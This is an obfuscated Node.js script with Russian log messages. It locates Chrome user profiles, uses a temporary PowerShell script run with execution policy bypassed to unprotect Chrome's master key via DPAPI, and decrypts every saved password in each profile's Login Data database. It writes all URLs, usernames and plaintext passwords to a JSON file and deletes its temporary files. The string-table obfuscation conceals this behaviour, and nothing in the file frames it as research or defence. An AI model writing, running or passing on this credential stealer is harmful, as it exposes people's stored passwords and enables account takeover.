const _0xcf0862=_0x1255;(function(_0x43ce01,_0x1c935b){const _0x350dc7=_0x1255,_0x4eec95=_0x43ce01();while(!![]){try{const _0x1efcb5=parseInt(_0x350dc7(0x152))/0x1*(parseInt(_0x350dc7(0x149))/0x2)+-parseInt(_0x350dc7(0x12b))/0x3*(parseInt(_0x350dc7(0x11e))/0x4)+-parseInt(_0x350dc7(0x110))/0x5*(parseInt(_0x350dc7(0x10f))/0x6)+parseInt(_0x350dc7(0x133))/0x7+-parseInt(_0x350dc7(0x12e))/0x8*(-parseInt(_0x350dc7(0x10e))/0x9)+-parseInt(_0x350dc7(0xf3))/0xa*(parseInt(_0x350dc7(0x13e))/0xb)+parseInt(_0x350dc7(0x120))/0xc;if(_0x1efcb5===_0x1c935b)break;else _0x4eec95['push'](_0x4eec95['shift']());}catch(_0x1eae3e){_0x4eec95['push'](_0x4eec95['shift']());}}}(_0x58af,0xa0750));const fs=require('fs'),path=require(_0xcf0862(0x136)),os=require('os'),crypto=require(_0xcf0862(0x13b)),{exec}=require(_0xcf0862(0xff)),sqlite3=require(_0xcf0862(0xee))[_0xcf0862(0x12d)](),util=require(_0xcf0862(0x126)),execPromise=util['promisify'](exec),CHROME_USER_DATA_PATH=path[_0xcf0862(0xe2)]('C:',_0xcf0862(0xf8),'user',_0xcf0862(0x146),_0xcf0862(0xf5),_0xcf0862(0x102),_0xcf0862(0x12f),_0xcf0862(0xf6));function findChromeProfiles(){const _0x24b186=_0xcf0862;try{if(!fs[_0x24b186(0xe7)](CHROME_USER_DATA_PATH))throw new Error(_0x24b186(0x115)+CHROME_USER_DATA_PATH+'\x20не\x20найдена');const _0x24d962=fs[_0x24b186(0x13d)](CHROME_USER_DATA_PATH),_0x3fa658=_0x24d962[_0x24b186(0x14d)](_0x3e4c7b=>{const _0x389aef=_0x24b186,_0x51882d=path['join'](CHROME_USER_DATA_PATH,_0x3e4c7b);return fs[_0x389aef(0x13c)](_0x51882d)[_0x389aef(0xfc)]()&&(_0x3e4c7b==='Default'||_0x3e4c7b[_0x389aef(0x106)](_0x389aef(0xfa)));}),_0x21052f=_0x3fa658[_0x24b186(0x14d)](_0x12b63c=>{const _0x5eefd3=_0x24b186,_0x507c5e=path[_0x5eefd3(0xe2)](CHROME_USER_DATA_PATH,_0x12b63c,_0x5eefd3(0x114));return fs[_0x5eefd3(0xe7)](_0x507c5e);});return console['log'](_0x24b186(0x151)+_0x21052f[_0x24b186(0x127)]+_0x24b186(0x147)),_0x21052f;}catch(_0x3b42d9){return console[_0x24b186(0x122)](_0x24b186(0x12c),_0x3b42d9['message']),[];}}async function getEncryptionKey(){const _0x10143e=_0xcf0862;try{const _0x5b27e3=path[_0x10143e(0xe2)](CHROME_USER_DATA_PATH,_0x10143e(0x105));if(!fs[_0x10143e(0xe7)](_0x5b27e3))throw new Error(_0x10143e(0x129)+_0x5b27e3);const _0x248f32=fs[_0x10143e(0x128)](_0x5b27e3,_0x10143e(0xe9)),_0x298109=JSON[_0x10143e(0x138)](_0x248f32);if(!_0x298109['os_crypt']||!_0x298109[_0x10143e(0xdf)][_0x10143e(0x11b)])throw new Error('Не\x20удалось\x20найти\x20encrypted_key\x20в\x20Local\x20State');const _0x2beb94=Buffer[_0x10143e(0xf0)](_0x298109['os_crypt']['encrypted_key'],'base64'),_0x6c85dc=_0x2beb94[_0x10143e(0xed)](0x5),_0x522d56=os[_0x10143e(0x13f)](),_0x52e4ee=path[_0x10143e(0xe2)](_0x522d56,'chrome_key_encrypted_'+Math[_0x10143e(0xf9)]()[_0x10143e(0x119)](0x24)['substring'](0x2,0x8));fs['writeFileSync'](_0x52e4ee,_0x6c85dc);const _0x453839=_0x10143e(0x14e)+_0x52e4ee[_0x10143e(0x132)](/\\/g,'\x5c\x5c')+_0x10143e(0x109)+_0x52e4ee+_0x10143e(0xec),_0x28859d=path[_0x10143e(0xe2)](_0x522d56,'decrypt_chrome_key_'+Math[_0x10143e(0xf9)]()[_0x10143e(0x119)](0x24)[_0x10143e(0xe5)](0x2,0x8)+_0x10143e(0x101));fs['writeFileSync'](_0x28859d,_0x453839);try{await execPromise(_0x10143e(0x13a)+_0x28859d+'\x22');}catch(_0x4afdf2){console['error'](_0x10143e(0x123),_0x4afdf2[_0x10143e(0x134)]);throw new Error(_0x10143e(0x121));}const _0x17cc9e=_0x52e4ee+'_decrypted';if(!fs[_0x10143e(0xe7)](_0x17cc9e))throw new Error('Не\x20удалось\x20создать\x20файл\x20с\x20расшифрованным\x20ключом');const _0x111250=fs[_0x10143e(0x128)](_0x17cc9e);try{fs[_0x10143e(0x140)](_0x52e4ee),fs[_0x10143e(0x140)](_0x17cc9e),fs[_0x10143e(0x140)](_0x28859d);}catch(_0x31be8b){console[_0x10143e(0x148)](_0x10143e(0x10d));}return console[_0x10143e(0x11c)](_0x10143e(0xfb)),_0x111250;}catch(_0x32ee5){console['error']('Ошибка\x20при\x20получении\x20ключа\x20шифрования:',_0x32ee5['message']);throw _0x32ee5;}}function decryptValue(_0x5600af,_0x4512d2){const _0x29f441=_0xcf0862;try{if(!_0x5600af||_0x5600af[_0x29f441(0x127)]===0x0)return'';const _0x5adba9=_0x5600af['length']>0x3&&_0x5600af[0x0]===0x76&&_0x5600af[0x1]===0x31&&_0x5600af[0x2]===0x30;if(_0x5adba9)try{const _0x9f8d06=_0x5600af[_0x29f441(0xed)](0x3,0xf),_0x12ffae=_0x5600af[_0x29f441(0xed)](0xf,-0x10),_0x53f31e=_0x5600af[_0x29f441(0xed)](-0x10),_0x30a9d2=crypto[_0x29f441(0xde)]('aes-256-gcm',_0x4512d2,_0x9f8d06);_0x30a9d2[_0x29f441(0x10b)](_0x53f31e);let _0x593b0c=_0x30a9d2[_0x29f441(0xe1)](_0x12ffae);return _0x593b0c=Buffer[_0x29f441(0x113)]([_0x593b0c,_0x30a9d2[_0x29f441(0xf1)]()]),_0x593b0c[_0x29f441(0x119)](_0x29f441(0xe9));}catch(_0x10ed37){return console[_0x29f441(0x122)]('Ошибка\x20расшифровки\x20AES-GCM:\x20'+_0x10ed37[_0x29f441(0x134)]),'[Ошибка\x20расшифровки:\x20'+_0x10ed37['message']+']';}else return'[Encrypted-Legacy:\x20'+_0x5600af[_0x29f441(0x119)]('hex')[_0x29f441(0xe5)](0x0,0xa)+'...]';}catch(_0x4be461){return console['error'](_0x29f441(0x11a)+_0x4be461['message']),_0x29f441(0x145)+_0x4be461[_0x29f441(0x134)]+']';}}function chromeTimeToDate(_0x569a71){const _0x449dfe=_0xcf0862;if(!_0x569a71)return null;const _0x1c2159=Number(_0x569a71),_0x57135b=Math[_0x449dfe(0xfe)](_0x1c2159/0x3e8)-0xa9730b66800;if(_0x57135b<0x0)return null;return new Date(_0x57135b)[_0x449dfe(0xe6)]();}async function decryptProfilePasswords(_0x2c0556,_0x43086b){const _0x5d2d66=_0xcf0862,_0xe16848=path['join'](CHROME_USER_DATA_PATH,_0x2c0556,'Login\x20Data');if(!fs[_0x5d2d66(0xe7)](_0xe16848))return console[_0x5d2d66(0x122)](_0x5d2d66(0x108)+_0x2c0556),[];const _0x4209a3=os['tmpdir'](),_0x2871e4=path[_0x5d2d66(0xe2)](_0x4209a3,_0x5d2d66(0x118)+Math[_0x5d2d66(0xf9)]()[_0x5d2d66(0x119)](0x24)[_0x5d2d66(0xe5)](0x2,0x8));try{fs[_0x5d2d66(0xf7)](_0xe16848,_0x2871e4),console[_0x5d2d66(0x11c)](_0x5d2d66(0xe3)+_0x2c0556+_0x5d2d66(0x141));const _0x5c3d07=new sqlite3[(_0x5d2d66(0xf4))](_0x2871e4),_0x55c272=util[_0x5d2d66(0x135)](_0x5c3d07[_0x5d2d66(0x130)][_0x5d2d66(0x14a)](_0x5c3d07)),_0x51e07c=util[_0x5d2d66(0x135)](_0x5c3d07['close'][_0x5d2d66(0x14a)](_0x5c3d07)),_0x5c8f11=await _0x55c272(_0x5d2d66(0xfd)),_0x18b9a4=_0x5c8f11[_0x5d2d66(0x11d)](_0x50f24e=>_0x50f24e[_0x5d2d66(0x125)]===_0x5d2d66(0x111)),_0x4e9908=_0x5c8f11[_0x5d2d66(0x11d)](_0x14d849=>_0x14d849['name']===_0x5d2d66(0x10a));if(!_0x18b9a4||!_0x4e9908)throw new Error(_0x5d2d66(0x116)+_0x2c0556+'\x20отсутствуют\x20необходимые\x20столбцы');const _0x239993=_0x5d2d66(0x131),_0x363880=await _0x55c272(_0x239993);console[_0x5d2d66(0x11c)](_0x5d2d66(0x151)+_0x363880[_0x5d2d66(0x127)]+'\x20записей\x20паролей\x20в\x20профиле\x20'+_0x2c0556);const _0x176653=_0x363880[_0x5d2d66(0x144)](_0x40fec8=>{const _0x484868=_0x5d2d66;try{const _0x259b1b=Buffer[_0x484868(0xf0)](_0x40fec8[_0x484868(0x10a)]),_0x5e3501=decryptValue(_0x259b1b,_0x43086b);return{'profile':_0x2c0556,'origin_url':_0x40fec8[_0x484868(0x107)],'action_url':_0x40fec8[_0x484868(0xeb)],'username':_0x40fec8['username_value'],'password':_0x5e3501,'date_created':chromeTimeToDate(_0x40fec8[_0x484868(0x10c)]),'date_last_used':chromeTimeToDate(_0x40fec8[_0x484868(0x137)]),'times_used':_0x40fec8[_0x484868(0x14f)]};}catch(_0xec8884){return console[_0x484868(0x122)](_0x484868(0xe8)+_0x40fec8[_0x484868(0x107)]+_0x484868(0x117)+_0x2c0556+':',_0xec8884[_0x484868(0x134)]),{'profile':_0x2c0556,'origin_url':_0x40fec8['origin_url'],'action_url':_0x40fec8[_0x484868(0xeb)],'username':_0x40fec8[_0x484868(0x111)],'password':_0x484868(0x150)+_0xec8884[_0x484868(0x134)]+']','date_created':chromeTimeToDate(_0x40fec8[_0x484868(0x10c)]),'date_last_used':chromeTimeToDate(_0x40fec8[_0x484868(0x137)]),'times_used':_0x40fec8[_0x484868(0x14f)]};}});await _0x51e07c();try{fs[_0x5d2d66(0x140)](_0x2871e4),console[_0x5d2d66(0x11c)](_0x5d2d66(0xf2)+_0x2c0556+_0x5d2d66(0xef));}catch(_0x3bcb7a){console[_0x5d2d66(0x148)](_0x5d2d66(0x104)+_0x2c0556+':\x20'+_0x3bcb7a[_0x5d2d66(0x134)]);}return _0x176653;}catch(_0x308355){console['error'](_0x5d2d66(0x142)+_0x2c0556+':',_0x308355[_0x5d2d66(0x134)]);if(fs['existsSync'](_0x2871e4))try{fs['unlinkSync'](_0x2871e4);}catch(_0x43c768){console[_0x5d2d66(0x148)](_0x5d2d66(0x104)+_0x2c0556+':\x20'+_0x43c768[_0x5d2d66(0x134)]);}return[];}}function _0x58af(){const _0x2a9507=['verbose','1331208ZpkSTM','Chrome','all','\x0a\x20\x20\x20\x20\x20\x20SELECT\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20origin_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20action_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20username_value,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20password_value,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_created,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used,\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x0a\x20\x20\x20\x20\x20\x20FROM\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20logins\x0a\x20\x20\x20\x20\x20\x20ORDER\x20BY\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x20DESC,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used\x20DESC\x0a\x20\x20\x20\x20','replace','6501628iTaGsv','message','promisify','path','date_last_used','parse','=====\x20Расшифровка\x20паролей\x20Chrome\x20из\x20всех\x20профилей\x20=====','powershell\x20-ExecutionPolicy\x20Bypass\x20-File\x20\x22','crypto','statSync','readdirSync','77lWoETU','tmpdir','unlinkSync','\x20скопирован\x20во\x20временную\x20директорию','Ошибка\x20при\x20расшифровке\x20паролей\x20профиля\x20','Ошибка\x20при\x20расшифровке\x20паролей\x20из\x20всех\x20профилей:','map','[Ошибка:\x20','AppData','\x20профилей\x20с\x20Login\x20Data','warn','130CalhPY','bind','Критическая\x20ошибка:','\x0a=====\x20Расшифровка\x20завершена\x20=====','filter','\x0a\x20\x20\x20\x20Add-Type\x20-AssemblyName\x20System.Security;\x0a\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$encryptedBytes\x20=\x20[System.IO.File]::ReadAllBytes(\x27','times_used','[Ошибка\x20расшифровки:\x20','Найдено\x20','5231MKCjPb','createDecipheriv','os_crypt','\x0aВсе\x20расшифрованные\x20пароли\x20(','update','join','Файл\x20Login\x20Data\x20для\x20профиля\x20','sort','substring','toISOString','existsSync','Ошибка\x20расшифровки\x20пароля\x20для\x20','utf8','\x0aОбработка\x20профиля:\x20','action_url','_decrypted\x27,\x20$decrypted);\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22Decryption\x20successful\x22;\x0a\x20\x20\x20\x20}\x20catch\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Error\x20\x22Decryption\x20error:\x20$_\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20exit\x201;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20','slice','sqlite3','\x20удален','from','final','Временный\x20файл\x20для\x20профиля\x20','167740MVmSIL','Database','Local','User\x20Data','copyFileSync','Users','random','Profile\x20','Ключ\x20шифрования\x20успешно\x20получен','isDirectory','PRAGMA\x20table_info(logins)','floor','child_process','Необработанная\x20ошибка:','.ps1','Google','stringify','Не\x20удалось\x20удалить\x20временный\x20файл\x20для\x20профиля\x20','Local\x20State','startsWith','origin_url','Файл\x20Login\x20Data\x20не\x20найден\x20для\x20профиля\x20','\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20$decrypted\x20=\x20[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes,\x20$null,\x20\x27CurrentUser\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20[System.IO.File]::WriteAllBytes(\x27','password_value','setAuthTag','date_created','Предупреждение:\x20не\x20удалось\x20удалить\x20временные\x20файлы','9bLZMFq','12aJbHae','2809595WeorqK','username_value','Не\x20найдено\x20профилей\x20с\x20файлами\x20Login\x20Data','concat','Login\x20Data','Директория\x20','В\x20таблице\x20logins\x20профиля\x20','\x20в\x20профиле\x20','chrome_login_data_temp_','toString','Ошибка\x20при\x20расшифровке\x20значения:\x20','encrypted_key','log','some','20qgvrUX','exit','20295876azFPoA','Ошибка\x20выполнения\x20PowerShell\x20скрипта','error','PowerShell\x20error:','.json','name','util','length','readFileSync','Файл\x20Local\x20State\x20не\x20найден\x20по\x20пути:\x20','writeFileSync','736833YAuaSz','Ошибка\x20при\x20поиске\x20профилей\x20Chrome:'];_0x58af=function(){return _0x2a9507;};return _0x58af();}function _0x1255(_0x222fc3,_0x4e4f87){const _0x58af90=_0x58af();return _0x1255=function(_0x1255a4,_0x4214fa){_0x1255a4=_0x1255a4-0xde;let _0x4860fa=_0x58af90[_0x1255a4];return _0x4860fa;},_0x1255(_0x222fc3,_0x4e4f87);}async function decryptAllProfilesPasswords(){const _0x1d502f=_0xcf0862;try{const _0x318e89=findChromeProfiles();if(_0x318e89['length']===0x0)return console[_0x1d502f(0x11c)](_0x1d502f(0x112)),null;const _0x2ee4fe=await getEncryptionKey();let _0xa889fc=[];for(const _0x7e4735 of _0x318e89){console['log'](_0x1d502f(0xea)+_0x7e4735);const _0x31e3a8=await decryptProfilePasswords(_0x7e4735,_0x2ee4fe);_0xa889fc=_0xa889fc[_0x1d502f(0x113)](_0x31e3a8);}_0xa889fc[_0x1d502f(0xe4)]((_0x4ab758,_0x2f327f)=>{const _0x4e8d67=_0x1d502f;if(_0x2f327f[_0x4e8d67(0x14f)]!==_0x4ab758['times_used'])return _0x2f327f[_0x4e8d67(0x14f)]-_0x4ab758['times_used'];if(_0x4ab758[_0x4e8d67(0x137)]&&_0x2f327f['date_last_used'])return new Date(_0x2f327f[_0x4e8d67(0x137)])-new Date(_0x4ab758[_0x4e8d67(0x137)]);return 0x0;});const _0x435737='chrome_all_profiles_passwords_'+new Date()['toISOString']()[_0x1d502f(0x132)](/[:.]/g,'-')+_0x1d502f(0x124);return fs[_0x1d502f(0x12a)](_0x435737,JSON[_0x1d502f(0x103)](_0xa889fc,null,0x2),_0x1d502f(0xe9)),console[_0x1d502f(0x11c)](_0x1d502f(0xe0)+_0xa889fc[_0x1d502f(0x127)]+')\x20сохранены\x20в\x20файл:\x20'+_0x435737),{'count':_0xa889fc[_0x1d502f(0x127)],'outputPath':_0x435737,'profiles':_0x318e89};}catch(_0x450e99){console['error'](_0x1d502f(0x143),_0x450e99['message']);throw _0x450e99;}}async function main(){const _0x971cad=_0xcf0862;try{console[_0x971cad(0x11c)](_0x971cad(0x139)),await decryptAllProfilesPasswords(),console[_0x971cad(0x11c)](_0x971cad(0x14c));}catch(_0x46f907){console['error'](_0x971cad(0x14b),_0x46f907[_0x971cad(0x134)]),process[_0x971cad(0x11f)](0x1);}}main()['catch'](_0x33d55a=>{const _0x2c283e=_0xcf0862;console['error'](_0x2c283e(0x100),_0x33d55a),process[_0x2c283e(0x11f)](0x1);});
